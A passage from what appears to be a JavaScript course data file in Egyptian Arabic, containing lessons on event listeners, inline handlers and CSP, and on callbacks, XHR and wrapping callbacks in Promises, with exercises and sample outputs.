اتقاس في تمرين ٢: [[s.onClick.bind(s) === s.onClick.bind(s)]] = [[false]]، والعدّاد كمّل يعدّ بعد [[stop()]]. الحل: خزّن الـ function في متغيّر أو field، أو استخدم [[signal]].

**الـ options:**

| الـ option | بيعمل إيه |
|---|---|
| [[{ once: true }]] | يتشال لوحده بعد أول مرة («مرة واحدة» اتطبعت مرة) |
| [[{ signal }]] | من [[AbortController]]: [[controller.abort()]] بتشيل كل الـ listeners اللي ليها نفس الـ signal مرة واحدة (تمرين ٤) |
| [[{ capture: true }]] | يشتغل وهو نازل من [[window]] للعنصر قبل الـ bubbling (درس «event delegation») |
| [[{ passive: true }]] | وعد إنك مش هتعمل [[preventDefault()]]، فالمتصفح يعمل scroll من غير ما يستناك |

**[[this]] جوه الـ listener:** في [[function]] عادية [[this]] = العنصر ([[e.currentTarget]])، وفي arrow [[this]] من برّه (اتقاس: [[this: buy]] و [[arrow this: true]] يعني [[window]]). الأوضح دايمًا: [[e.currentTarget]].

---

## ٢. الـ event handler property: [[el.onclick = fn]]

~~~text الناتج: [[onclick]] اتعيّن مرتين
onclick 2
~~~

خاصية عادية على العنصر: قيمة واحدة. التاني مسح الأول، و [[= null]] بيشيله ([[typeof buy.onclick]] بقى [["object"]] لأن [[null]]). كل حدث ليه property: [[onclick]] و [[oninput]] و [[onsubmit]] و [[onload]] و [[onerror]] و [[onkeydown]]...

**إمتى تقبلها:** object انت عامله وعارف إن مفيش حد غيرك هيسمع، زي [[img.onload]] و [[xhr.onload]] و [[reader.onload]] (الدرس الجاي) و [[anim.onfinish]]. **إمتى لأ:** أي عنصر في الصفحة ممكن كود تاني (مكتبة، إضافة، زميلك) يسمع عليه: [[onclick =]] بتاعه هيمسح بتاعك من غير أي error.

**حاجتين غريبين اتقاسوا:**

- **[[buy.onclick = "console.log('x')"]]** (نص مش function) بيتجاهل: القيمة بقت [[null]].
- **المكان في الترتيب:** الـ handler property بياخد مكانه في لستة الـ listeners أول مرة تعيّنه، والتعيين التاني بيبدّل الكود في نفس المكان. لكن بعد [[= null]] والتعيين من جديد بيروح لآخر اللستة. عشان كده المثال طبع «onclick 2» قبل «listener» مع إنه اتعيّن قبله وبعده.

---

## ٣. الـ inline attribute: [[onclick="..."]] وليه لأ

الكود مكتوب كنص جوه الـ HTML، والمتصفح بيحوّله لـ function وقت ما يحتاجها:

~~~html
<form><input name="q" value="قهوة"><button type="button" onclick="console.log('inline:', this.id, event.type, q.value)" id="b">اطلب</button></form>
~~~

~~~text الناتج
inline: b click قهوة
~~~

جواها [[this]] = العنصر، و [[event]] = الحدث، و [[q]] = حقل الفورم اسمه q! الـ function دي بتشوف خصايص العنصر نفسه والفورم والـ document كأنها متغيّرات (scope غريب)، فأي اسم تكتبه ممكن يتصادم مع حاجة متعرفهاش.

**ليه متستخدمهاش، بالترتيب:**

**١. الـ CSP بيمنعها.** أي موقع جاد بيبعت [[Content-Security-Policy]] عشان يقلل الـ XSS (درس «Content Security Policy» في تاب الـ web). نفس الصفحة بالـ header ده [[script-src 'self']]: الـ property والـ listener اشتغلوا، والـ inline اتمنع:

~~~text الـ Console (Chrome 157، ضغطة على زرار الـ inline)
Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
property اشتغل
listener اشتغل
~~~

الخطأ بيظهر **وقت الضغطة** مش وقت التحميل، فالصفحة شكلها سليم لحد ما حد يدوس. والـ nonce و الـ hash مبيشتغلوش على الـ attributes (زي ما الرسالة بتقول) إلا بـ [[unsafe-hashes]]. الحل الوحيد النضيف: تشيلها.

**٢. لازم الـ function تبقى global.** [[onclick="addToCart(1)"]] بيدوّر على [[addToCart]] في [[window]]. ولو كودك [[type="module"]] (والمفروض يبقى)، الـ function مش على [[window]]:

~~~text الـ Console (Chrome 157، نفس الصفحة والكود module)
Uncaught ReferenceError: addToCart is not defined
    at HTMLButtonElement.onclick
~~~

**٣. الكود متقسم بين ملفين:** تقرا الـ JS متعرفش مين بينده الـ function، ومحدش بيعمل lint أو test للنص اللي جوه الـ attribute.

**٤. مفيش options ولا شيل نضيف.**

التحويل سهل: [[data-*]] في الـ HTML وlistener واحد (تمرين ٣).

---

## ٤. الترتيب لما الطرق تتجمع

~~~text الناتج: تمرين ١ (onclick ثم listener ثم onclick تاني ثم d مرتين ثم once، وضغطتين)
C B D E C B D
~~~

كل الـ listeners على نفس العنصر بيشتغلوا بترتيب التسجيل، والـ handler property ليه مكان واحد في اللستة.

---

## الخلاصة

| عايز | اكتب |
|---|---|
| تسمع على حدث | [[el.addEventListener("click", fn)]] |
| تشيله | [[el.removeEventListener("click", fn)]] بنفس [[fn]] |
| مرة واحدة | [[{ once: true }]] |
| تشيل مجموعة مرة واحدة | [[{ signal: controller.signal }]] و [[controller.abort()]] |
| handler واحد على object انت عامله | [[img.onload = fn]] |
| حاجة في الـ HTML | [[data-*]] attribute، مش [[onclick="..."]] |

اللي ميتلخبطش: [[removeEventListener]] بيقارن الـ reference، و [[bind]] و arrow جديدة مش هي. و [[onclick =]] بيمسح اللي قبله من غير ما يقولك. و [[onclick="..."]] بيقع مع CSP ومع modules.`,
          lines: [
            R`الزرار اللي هنجرّب عليه`,
            R`event handler property: قيمة واحدة على الخاصية [[onclick]]`,
            R`التعيين التاني بيمسح الأول، فـ «onclick 1» مش هتتطبع أبدًا`,
            R`function ليها اسم، عشان نقدر نشيلها بعدين بنفس الـ reference`,
            R`أول listener بـ [[addEventListener]]: بيتحط في اللستة بعد مكان الـ [[onclick]]`,
            R`نفس النوع ونفس الـ function: المتصفح بيتجاهله، فـ [[hello]] هتشتغل مرة واحدة`,
            R`[[{ once: true }]]: بيتشال لوحده بعد أول مرة`,
            R`[[click()]] بيعمل ضغطة من الكود: بيطبع «onclick 2» و «listener» و «مرة واحدة»`,
            R`بنشيل [[hello]] بنفس الـ reference، فاتشالت فعلًا`,
            R`[[null]] بيشيل الـ handler property`,
            R`الضغطة التانية مبتطبعش حاجة: كل الطرق اتشالت`,
          ],
          practice: [
            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[b.onclick = () => log.push("A")]] ثم [[b.addEventListener("click", () => log.push("B"))]] ثم [[b.onclick = () => log.push("C")]] ثم [[d]] (بيضيف «D») بـ [[addEventListener]] مرتين ثم [[() => log.push("E")]] بـ [[{ once: true }]]. وبعدين [[b.click()]] مرتين. إيه اللي في [[log.join(" ")]]؟ (من قسمي ١ و ٤ في الشرح).`, done: R`كتبت «C B D E C B D» قبل التشغيل، وعارف ليه C الأول وليه D مرة واحدة في كل ضغطة.`, sol: R`~~~html order.html
<button id="b">دوس</button>
<script>
const b = document.querySelector("#b");
const log = [];
b.onclick = () => log.push("A");
b.addEventListener("click", () => log.push("B"));
b.onclick = () => log.push("C");
function d() { log.push("D"); }
b.addEventListener("click", d);
b.addEventListener("click", d);
b.addEventListener("click", () => log.push("E"), { once: true });
b.click();
b.click();
console.log(log.join(" "));
</script>
~~~

~~~text الناتج (Chrome 157)
C B D E C B D
~~~

- **C الأول:** الـ property خدت أول مكان في اللستة لما اتعيّنت A، و C اتكتبت في نفس المكان.
- **D مرة في كل ضغطة:** التسجيل التاني لنفس الـ function اتجاهل.
- **E في الأولى بس:** [[once]].` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** class [[Saver]] فيها [[start() { this.btn.addEventListener("click", this.onClick.bind(this)); }]] و [[stop() { this.btn.removeEventListener("click", this.onClick.bind(this)); }]]. ادوس، [[stop()]]، ادوس تاني: العدّاد بقى كام؟ ليه؟ صلّحها بطريقتين (من قسم ١ في الشرح).`, done: R`النسخة البايظة عدّت ٢، والمصلّحة عدّت ١، وعرفت إن [[bind]] بيرجّع function جديدة كل مرة.`, sol: R`~~~html saver.html
<button id="save">احفظ</button>
<script>
class Saver {
  constructor(btn) { this.btn = btn; this.count = 0; }
  onClick() { this.count++; }
  start() { this.btn.addEventListener("click", this.onClick.bind(this)); }
  stop() { this.btn.removeEventListener("click", this.onClick.bind(this)); }
}
const s = new Saver(document.querySelector("#save"));
s.start(); s.btn.click(); s.stop(); s.btn.click();
console.log("بايظ:", s.count, s.onClick.bind(s) === s.onClick.bind(s));

// الحل ١: arrow في class field، فالـ reference ثابت
class Saver2 {
  constructor(btn) { this.btn = btn; this.count = 0; }
  onClick = () => { this.count++; };
  start() { this.btn.addEventListener("click", this.onClick); }
  stop() { this.btn.removeEventListener("click", this.onClick); }
}
const s2 = new Saver2(document.querySelector("#save"));
s2.start(); s2.btn.click(); s2.stop(); s2.btn.click();
console.log("صح:", s2.count);
</script>
~~~

~~~text الناتج (Chrome 157)
بايظ: 2 false
صح: 1
~~~

- **[[bind]] بيعمل function جديدة كل مرة** ([[false]] في المقارنة)، فـ [[removeEventListener]] دوّر على function مش متسجلة ومعملش حاجة، ومفيش error.
- **الحل ١:** [[onClick = () => {...}]] كـ class field: function واحدة لكل object، و [[this]] فيها هو الـ object.
- **الحل ٢ (الأنضف لما فيه كذا listener):** [[start() { this.ctrl = new AbortController(); this.btn.addEventListener("click", () => this.count++, { signal: this.ctrl.signal }); }]] و [[stop() { this.ctrl.abort(); }]].` },
            { lvl: 'تطبيق', t: R`**refactor:** صفحة فيها [[<button onclick="addToCart(1)">قهوة</button>]] و [[<button onclick="addToCart(2)">شاي</button>]] و [[app.js]] فيه [[function addToCart(id)]]. شغّلها من سيرفر بيبعت [[Content-Security-Policy: script-src 'self']] وشوف الـ Console. وبعدين حوّلها لـ [[data-id]] و listener واحد، وخلي [[app.js]] يبقى [[type="module"]] (من قسم ٣ في الشرح).`, done: R`قبل: الضغطة مبتعملش حاجة ورسالة CSP في الـ Console. بعد: «السلة: 2 (آخر صنف 2)» بعد ضغطتين، ومفيش رسايل، و [[typeof window.addToCart]] = [["undefined"]].`, sol: R`~~~html index.html (بعد)
<!doctype html>
<html lang="ar" dir="rtl">
<head><meta charset="utf-8"><title>بعد</title></head>
<body>
<div id="products">
  <button type="button" data-id="1">قهوة</button>
  <button type="button" data-id="2">شاي</button>
</div>
<p id="cart">السلة: 0</p>
<script type="module" src="app.js"></script>
</body>
</html>
~~~

~~~js app.js (بعد)
let count = 0;
function addToCart(id) {
  count++;
  document.querySelector("#cart").textContent = "السلة: " + count + " (آخر صنف " + id + ")";
}
document.querySelector("#products").addEventListener("click", e => {
  const btn = e.target.closest("button[data-id]");
  if (btn) addToCart(Number(btn.dataset.id));
});
console.log("addToCart على window؟", typeof window.addToCart);
~~~

~~~text الناتج (Chrome 157، السيرفر بيبعت script-src 'self')
قبل: ضغطة على «قهوة» ← رسالة «Executing inline event handler violates ...» مرتين في الـ Console، والسلة فضلت «السلة: 0»
بعد: addToCart على window؟ undefined
بعد: ضغطتين ← «السلة: 2 (آخر صنف 2)»
~~~

- **السيرفر اللي جرّبنا بيه** (سيرفر [[node:http]] صغير) كان بيعمل [[res.setHeader("Content-Security-Policy", "script-src 'self'")]] لأي صفحة تحت [[/csp/]]. في Chrome 157 الرسالة ظهرت مرتين لضغطة واحدة.
- **[[data-id]]** بيشيل البيانات في الـ HTML، والسلوك كله في الـ JS. و [[Number(...)]] لأن [[dataset]] دايمًا نص.
- **listener واحد على الأب** بدل واحد لكل زرار (event delegation)، فالزراير اللي تتضاف بعدين شغالة من غير كود زيادة.
- **الـ module** خلّى [[addToCart]] مش global، فمحدش برّه يقدر يناديها أو يكتب عليها.` },
            { lvl: 'تطبيق', t: R`**ابني:** بانل «الفلاتر» بيفتح بزرار، ولما يفتح بيسجّل ٣ listeners (Esc على [[document]]، وضغطة برّه البانل، وزرار «اقفل») كلهم بنفس [[signal]]، ولما يقفل [[controller.abort()]] واحدة تشيلهم كلهم. اعرض عدد الـ listeners الشغالة في سطر (من قسم ١ في الشرح).`, done: R`بعد الفتح العدد ٣، وبعد Esc أو ضغطة برّه أو «اقفل» العدد ٠، وفتحه مرتين ورا بعض مبيسجلش ٦.`, sol: R`~~~live 230 بانل بـ AbortController
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 240px; }
  #panel { border: 2px solid #0b6e4f; border-radius: 8px; padding: 10px; margin-top: 8px; max-width: 300px; background: #fff; }
  button { font: inherit; }
</style>
<button type="button" id="open">افتح الفلاتر</button>
<p id="log">listeners شغالة: 0</p>
<div id="panel" hidden>
  <p>الفلاتر هنا. اقفلها بـ Esc أو بضغطة برّه.</p>
  <button type="button" id="close">اقفل</button>
</div>
<script>
const panel = document.querySelector("#panel");
const log = document.querySelector("#log");
let controller = null;
let active = 0;

function count(n) { active += n; log.textContent = "listeners شغالة: " + active; }

function openPanel() {
  if (controller) return;
  panel.hidden = false;
  controller = new AbortController();
  const { signal } = controller;
  document.addEventListener("keydown", e => { if (e.key === "Escape") closePanel(); }, { signal });
  document.addEventListener("click", e => { if (!panel.contains(e.target) && e.target.id !== "open") closePanel(); }, { signal });
  document.querySelector("#close").addEventListener("click", closePanel, { signal });
  count(3);
  signal.addEventListener("abort", () => count(-3), { once: true });
}
function closePanel() {
  panel.hidden = true;
  controller.abort();
  controller = null;
}
document.querySelector("#open").addEventListener("click", openPanel);
</script>
~~~

~~~text الناتج (Chrome 157، Playwright)
فتح:           listeners شغالة: 3 (البانل ظاهر)
فتح تاني:      listeners شغالة: 3
Esc:           listeners شغالة: 0 (البانل مستخبي)
ضغطة جوه:      البانل لسه ظاهر
ضغطة برّه:     listeners شغالة: 0
زرار «اقفل»:   listeners شغالة: 0
~~~

- **[[{ signal }]]** بيربط كل listener بالـ controller. [[abort()]] بيشيلهم كلهم، حتى الـ arrows اللي ملهاش اسم (اللي [[removeEventListener]] مكانش هيعرف يشيلها).
- **[[if (controller) return]]** بيمنع إن الفتح مرتين يسجّل ٦.
- **[[e.target.id !== "open"]]:** نفس الضغطة اللي فتحت البانل بتوصل لـ [[document]] بالـ bubbling، ومن غير الشرط ده كانت هتقفله على طول.
- **controller جديد كل فتحة:** الـ signal اللي اتعمله [[abort]] مبيرجعش، وأي listener تسجّله بيه بعد كده مش بيتسجّل أصلًا.` },
            { lvl: 'سريع', t: R`**اشرحها:** زميلك بيقولك «[[onclick="save()"]] أسهل وشغالة عندي». اكتبله ٣ أسباب في ٣ سطور ليه هتقع في الشغل الحقيقي، بالخطأ اللي هيشوفه في كل سبب (من قسم ٣ في الشرح).`, done: R`٣ أسباب مختلفة، كل واحد معاه رسالة الخطأ أو النتيجة الحقيقية.`, sol: R`**إجابة نموذجية:**

1. **الـ CSP:** أول ما الموقع يحط [[Content-Security-Policy]] من غير [[unsafe-inline]] (وده المفروض في أي موقع فيه login)، الضغطة مش هتعمل حاجة والـ Console هيقول «Executing inline event handler violates the following Content Security Policy directive». ومفيش nonce ينفع مع الـ attribute.
2. **الـ modules:** لو الكود [[type="module"]] أو اتعمله bundle، [[save]] مش global، والضغطة هترمي «Uncaught ReferenceError: save is not defined». والحل الغلط إنك تكتب [[window.save = save]] وتفتح كل حاجة للعالم.
3. **الصيانة:** الكود اللي بيتنفّذ مكتوب كنص في الـ HTML، فالـ lint والـ tests والبحث عن «مين بينده save» مش هيلاقوه، ولو حد عمل [[el.onclick = ...]] من JS هيمسحه من غير error.

والبديل في سطرين: [[<button data-action="save">]] و [[document.addEventListener("click", e => { if (e.target.closest("[data-action=save]")) save(); })]].` },
          ],
          ref: [
            { t: "MDN: EventTarget.addEventListener()", url: "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener" },
            { t: "MDN: EventTarget.removeEventListener()", url: "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener" },
            { t: "MDN Learn: Introduction to events", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Events" },
            { t: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" },
            { t: "MDN: CSP script-src", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src" },
          ],
          pre: ["js/addEventListener", { to: "web/Content Security Policy", why: R`الـ header اللي بيمنع الـ inline handlers، وإزاي تقراه في DevTools` }, { to: "js/call و apply و bind", why: R`ليه [[bind]] بيرجّع function جديدة` }],
          deep: {
            why: R`الـ MDN Curriculum بيطلب الطرق التلاتة لأنك هتقابلهم كلهم: [[addEventListener]] في كودك، و [[onload =]] في APIs قديمة، و [[onclick="..."]] في كود قديم أو tutorials. ولازم تعرف تحوّل التالتة للأولى قبل ما الـ CSP يكسر الموقع.`,
            how: R`كل [[EventTarget]] عنده لستة listeners. [[addEventListener]] بيضيف لها لو التوليفة (النوع، الـ function، [[capture]]) مش موجودة. الـ handler property listener واحد خاص في نفس اللستة، والتعيين بيبدّل الـ function اللي فيه. الـ inline attribute بيتحوّل لنفس الـ handler property، والتحويل نفسه (compile للنص) هو اللي الـ CSP بيمنعه.`,
            when: R`[[addEventListener]] دايمًا للعناصر. [[signal]] لأي مجموعة listeners ليها عمر (مودال، صفحة في SPA، component). الـ property لـ object انت صاحبه لوحدك ([[img.onload]] و [[reader.onload]]). الـ inline أبدًا في كود جديد.`,
            mistakes: R`[[removeEventListener]] بـ arrow أو [[bind]] جديدة. [[onclick =]] على عنصر مكتبة تانية بتسمع عليه. [[onclick="..."]] مع CSP أو module. [[addEventListener("onclick")]] (اسم الحدث [["click"]] من غير on). نسيان [[capture: true]] في الشيل لو اتسجّل بيه.`,
          },
        },
        {
          cmd: "callbacks و events: الـ async قبل Promise",
          title: "قبل Promise و await: إزاي JavaScript كان بيستنى بالـ callbacks والأحداث، وإزاي تحوّلهم لـ Promise",
          desc: R`قبل 2015 مكانش فيه [[Promise]]. أي حاجة بتاخد وقت (تايمر، ملف، طلب شبكة، صورة) كانت بتاخد **callback**: function بتديها للـ API وهو بينادي عليها لما يخلص، أو بتطلّع **أحداث** ([[load]] و [[error]]) تسمع عليها. الأسلوبين لسه موجودين في كل حتة، والدرس ده بيوريك شكلهم ومشاكلهم وإزاي تلفّهم في Promise عشان تستخدم [[await]].
• Node: الـ error-first callback [[(err, value) => {}]] و [[util.promisify]] و [[fs/promises]].
• المتصفح: [[XMLHttpRequest]] بأحداث [[load]] و [[error]]، و [[img.onload]] و [[img.onerror]].
• المشاكل: callback hell، ونسيان [[return]] بعد الخطأ، وcallback بيتنده مرتين، وcallback مرة sync ومرة async.
• الحل: [[new Promise((resolve, reject) => ...)]] حوالين الـ callback، و [[events.once]] للأحداث.`,
          example: R`const fs = require("node:fs");
console.log("1. قبل");
setTimeout(() => console.log("4. الـ timer خلص"), 0);
fs.readFile("shop.json", "utf8", (err, text) => {
  if (err) return console.log("5. خطأ:", err.code);
  console.log("5. الملف:", JSON.parse(text).name);
});
fs.readFile("missing.json", "utf8", (err, text) => {
  if (err) return console.log("6. خطأ:", err.code, typeof text);
});
console.log("2. بعد");
console.log("3. الكود خلص، والـ callbacks لسه مستنية");`,
          try: R`اعمل [[shop.json]] فيه [[{"name":"متجر النور","orders":3}]] وشغّل المثال بـ [[node callbacks.js]]. بالترتيب إيه؟ وشغّله ٣ مرات: ٥ و ٦ بيتبدّلوا؟ وبعدين شيل [[return]] من سطر الخطأ الأول وغيّر اسم الملف لحاجة مش موجودة: إيه اللي حصل؟`,
          sol: R`~~~text الناتج (node callbacks.js، Node 24.22)
1. قبل
2. بعد
3. الكود خلص، والـ callbacks لسه مستنية
4. الـ timer خلص
6. خطأ: ENOENT undefined
5. الملف: متجر النور
~~~

- ١ و ٢ و ٣ الأول دايمًا: الكود العادي بيخلص كله قبل أي callback.
- ٦ قبل ٥ هنا لأن الملف اللي مش موجود فشل أسرع من قراية الملف الموجود. **الترتيب بين ٥ و ٦ مش مضمون**: كل واحد بيخلص في وقته. لو محتاج ترتيب، لازم التاني يبدأ جوه callback الأول (وده اللي بيعمل callback hell) أو [[await]].
- من غير [[return]]: الكود كمّل بعد سطر الخطأ، و [[text]] = [[undefined]]، و [[JSON.parse(undefined)]] رمى [[SyntaxError: "undefined" is not valid JSON]] ووقّع البرنامج (تمرين ٣).`,
          teach: R`## الفكرة

JavaScript بيشغّل حاجة واحدة في المرة (درس «event loop»). لو استنى ملف أو شبكة، الصفحة كلها هتقف. فالـ APIs البطيئة بتشتغل في الخلفية، والسؤال: إزاي ترجّعلك النتيجة؟ من أول JavaScript لحد 2015 كان فيه إجابتين بس:

| الأسلوب | الشكل | فين لسه موجود |
|---|---|---|
| **callback** | تبعت function، والـ API ينادي عليها مرة لما يخلص | [[setTimeout]]، و [[fs.readFile]] في Node، ومكتبات قديمة |
| **events** | الـ object بيطلّع أحداث، وانت تسمع عليها (ممكن تتكرر) | [[XMLHttpRequest]] و [[img.onload]] و [[FileReader]] و [[EventEmitter]] و [[WebSocket]] |

وبعدين جه [[Promise]] (ES2015) و [[async]] و [[await]] (ES2017) كطبقة فوقهم. كل نواتج Node من Node 24.22، ونواتج المتصفح من Chrome 157.

---

## ١. الـ callback: «ناديني لما تخلص»

~~~text الناتج: المثال
1. قبل
2. بعد
3. الكود خلص، والـ callbacks لسه مستنية
4. الـ timer خلص
6. خطأ: ENOENT undefined
5. الملف: متجر النور
~~~

**[[setTimeout(fn, 0)]]** معناها «شغّل [[fn]] بعد صفر ms على الأقل»، بس مش دلوقتي: بعد ما الكود الحالي يخلص. عشان كده ٤ بعد ٣.

**الـ error-first callback** (اتفاق Node): أول argument دايمًا الخطأ ([[null]] لو مفيش)، والتاني النتيجة. فالـ callback لازم يبدأ بـ [[if (err) return ...]]. لما الملف مش موجود: [[err.code]] = [["ENOENT"]] (Error NO ENTry) و [[text]] = [[undefined]].

**الترتيب بين ٥ و ٦ مش مضمون:** العمليتين اتبعتوا مع بعض، واللي يخلص الأول callback بتاعه يتنده الأول.

---

## ٢. الأحداث: نفس الفكرة بس ممكن تتكرر

**[[XMLHttpRequest]]** (XHR) هو اللي كان بيعمل الطلبات قبل [[fetch]]:

~~~js xhr.js (في صفحة)
const xhr = new XMLHttpRequest();
xhr.open("GET", "shop.json");
xhr.responseType = "json";
xhr.addEventListener("load", () => console.log("XHR load:", xhr.status, xhr.response.name));
xhr.addEventListener("error", () => console.log("XHR error"));
xhr.addEventListener("loadend", () => console.log("XHR loadend"));
xhr.send();
console.log("XHR اتبعت، والكود كمّل");
~~~

~~~text الناتج (Chrome 157)
XHR اتبعت، والكود كمّل
XHR load: 200 متجر النور
XHR loadend
~~~

- [[load]] بيتنده لأي رد من السيرفر، **حتى 404**. انت اللي تفحص [[xhr.status]]. و [[error]] للشبكة بس (زي [[fetch]] بالظبط: درس «fetch و AbortController»).
- [[loadend]] بعد النجاح أو الفشل، زي [[finally]].
- فيه كمان [[progress]] (نسبة التحميل) و [[timeout]] و [[abort]]. [[progress]] للـ upload هو السبب الوحيد اللي ممكن يخليك تستخدم XHR النهارده (درس «drag and drop و progress»).

وفي Node، [[EventEmitter]] (درس «EventEmitter») بنفس الفكرة: [[stream.on("data", ...)]] و [[server.on("request", ...)]].

---

## ٣. المشاكل اللي خلّت Promise يتعمل

**أ. callback hell:** ٣ خطوات ورا بعض = ٣ مستويات جوه بعض، وفحص خطأ في كل مستوى:

~~~js hell.js
const fs = require("node:fs");
fs.readFile("shop.json", "utf8", (err, text) => {
  if (err) return console.log("فشل ١:", err.code);
  const shop = JSON.parse(text);
  fs.writeFile("report.txt", shop.name + ": " + shop.orders + " طلبات\n", err => {
    if (err) return console.log("فشل ٢:", err.code);
    fs.readFile("report.txt", "utf8", (err, report) => {
      if (err) return console.log("فشل ٣:", err.code);
      console.log("التقرير:", report.trim());
    });
  });
});
~~~

~~~text الناتج
التقرير: متجر النور: 3 طلبات
~~~

ونفس الخطوات بـ [[fs/promises]] و [[await]]: سطر لكل خطوة، و [[catch]] واحد:

~~~js flat.js
const fs = require("node:fs/promises");
async function main() {
  const shop = JSON.parse(await fs.readFile("shop.json", "utf8"));
  await fs.writeFile("report.txt", shop.name + ": " + shop.orders + " طلبات\n");
  console.log("التقرير:", (await fs.readFile("report.txt", "utf8")).trim());
}
main().catch(err => console.log("فشل:", err.code));
~~~

~~~text الناتج
التقرير: متجر النور: 3 طلبات
~~~

وفيه مشكلة في [[hell.js]] مش باينة: لو [[JSON.parse]] رمت، محدش هيمسكها (مش جوه [[if (err)]])، والبرنامج يقع. في [[flat.js]] الـ [[catch]] بيمسك الاتنين.

**ب. inversion of control:** انت سلّمت الـ function بتاعتك لكود تاني، وهو اللي يقرر يناديها إمتى وكام مرة:

~~~js twice.js
function badRead(cb) { cb(null, "أول"); cb(null, "تاني"); }
badRead((err, v) => console.log("callback:", v));
new Promise(resolve => badRead((e, v) => resolve(v))).then(v => console.log("promise:", v));
~~~

~~~text الناتج
callback: أول
callback: تاني
promise: أول
~~~

الـ callback اتنده مرتين (تخيّل ده بيدفع فلوس). الـ Promise اتحلّت مرة واحدة: أي [[resolve]] بعد الأولى بتتجاهل. ده ضمان مبني جوه Promise.

**ج. مرة sync ومرة async:** callback بيتنده على طول لو الداتا في الكاش، وبعدين لو من الشبكة:

~~~text الناتج: «قبل» ثم كاش ثم شبكة ثم «بعد»
قبل
من الكاش
بعد
من الشبكة
~~~

الكود اللي بعد النداء مش عارف هيشتغل قبل الـ callback ولا بعده. Promise بيحل ده: [[.then]] دايمًا بيتنده async (microtask) حتى لو الـ Promise محلولة خلاص.

---

## ٤. لفّ callback في Promise

القاعدة: [[new Promise((resolve, reject) => { ... })]]، وجواها نادي الـ API القديم، وفي الـ callback بتاعه نادي [[resolve(value)]] أو [[reject(err)]]:

~~~js read-json.js
function readJson(path) {
  return new Promise((resolve, reject) => {
    fs.readFile(path, "utf8", (err, text) => {
      if (err) return reject(err);
      try { resolve(JSON.parse(text)); } catch (e) { reject(e); }
    });
  });
}
~~~

~~~text الناتج: await readJson("shop.json") ثم readJson("missing.json")
{ name: 'متجر النور', orders: 3 }
ENOENT
~~~

ونفس الحكاية للأحداث في المتصفح: الصورة.

~~~js load-image.js
function loadImage(src) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(img);
    img.onerror = () => reject(new Error("الصورة مش موجودة: " + src));
    img.src = src;
  });
}
~~~

~~~text الناتج (Chrome 157)
loadImage: 40 40
loadImage: الصورة مش موجودة: nope.png
~~~

لاحظ إن [[onload]] اتعيّن **قبل** [[src]]: لو الصورة في الكاش ممكن تخلص بسرعة جدًا. (والمتصفحات الجديدة فيها [[await img.decode()]] جاهزة.) وهنا الـ handler property مقبولة لأن الـ [[Image]] ده بتاعنا لوحدنا (الدرس اللي فات).

---

## ٥. [[util.promisify]]: اللف الجاهز في Node

أي function آخر argument فيها error-first callback، [[util.promisify]] بيرجّعلك نسخة بترجّع Promise:

~~~js promisify.js
const fs = require("node:fs");
const { promisify } = require("node:util");
const readFile = promisify(fs.readFile);
const wait = promisify(setTimeout);
readFile("shop.json", "utf8").then(text => console.log(text.length, "حرف"));
wait(50, "خلص").then(console.log);
~~~

~~~text الناتج (node promisify.js)
32 حرف
خلص
~~~

- [[promisify(setTimeout)]] اشتغلت مع إن [[setTimeout]] الـ callback بتاعها أول argument مش آخر واحد. السبب: Node حاطط عليها نسخة جاهزة في [[setTimeout[util.promisify.custom]]] (اتقاس: [["function"]]). لو عملت promisify بإيدك على [[setTimeout]] هتاخد [[ERR_INVALID_ARG_TYPE]] (تمرين ٢).
- [[promisify(5)]] بيرمي [[TypeError: The "original" argument must be of type function. Received type number (5)]].
- العكس موجود: [[util.callbackify(asyncFn)]] لو مكتبة قديمة عايزة callback.
- **النهارده:** كل حاجة في Node ليها نسخة Promise جاهزة: [[node:fs/promises]] و [[node:timers/promises]] و [[node:stream/promises]] و [[node:dns/promises]]. [[promisify]] لمكتباتك القديمة بس.
- **للأحداث:** [[const [dish] = await once(oven, "ready")]] من [[node:events]] بتستنى أول مرة الحدث يحصل (اتقاس: [[await once: كيكة]]).

---

## الخلاصة

| عندك | اعمل |
|---|---|
| API بـ error-first callback في Node | النسخة [[/promises]]، أو [[util.promisify]] |
| API قديم بـ callback أو حدث ([[onload]]) | [[new Promise((resolve, reject) => ...)]] حواليه |
| حدث بيحصل مرة وعايز تستناه | [[events.once]] في Node، أو [[{ once: true }]] جوه Promise |
| حدث بيتكرر ([[progress]]، [[message]]) | خليه listener عادي: Promise بتتحل مرة واحدة بس |

اللي ميتلخبطش: [[return]] قبل أي callback للخطأ، والترتيب بين عمليتين async مش مضمون، والـ Promise بتتحل مرة واحدة ودايمًا async.`,
          lines: [
            R`موديول الملفات في Node، بنسخة الـ callbacks`,
            R`كود عادي: بيتنفّذ على طول`,
            R`[[setTimeout]] بـ ٠: الـ callback بيستنى لحد ما الكود الحالي يخلص`,
            R`قراية ملف: Node بيقراه في الخلفية وينادي الـ callback بـ [[(err, text)]] لما يخلص`,
            R`error-first: لو فيه خطأ اطبعه و [[return]] عشان منكمّلش بـ [[text]] فاضي`,
            R`مفيش خطأ: [[text]] فيه محتوى الملف كنص`,
            R`قفلة الـ callback`,
            R`قراية ملف مش موجود: الـ callback هيتنده بـ [[err]]`,
            R`الملف مش موجود: [[err.code]] = [["ENOENT"]] و [[text]] = [[undefined]]، فبنطبعهم ونرجع`,
            R`قفلة الـ callback التاني`,
            R`كود عادي: بيتنفّذ قبل أي callback`,
            R`آخر سطر في الملف: بعده البرنامج بيستنى الـ callbacks اللي لسه متندهتش`,
          ],
          practice: [
